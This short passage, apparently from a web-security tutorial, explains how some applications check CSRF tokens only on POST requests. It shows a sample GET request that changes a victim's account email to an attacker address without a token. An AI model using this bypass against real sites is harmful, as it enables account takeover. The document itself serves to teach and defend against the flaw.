Some applications only validates the CSRF token if the request uses the `POST` method, leading to other request methods not validating the token. This leads to an attacker simply switching to `GET` method, for example, to bypass the validation and deliver an attack.

Correct request:
```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

CSRF bypass request:
```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```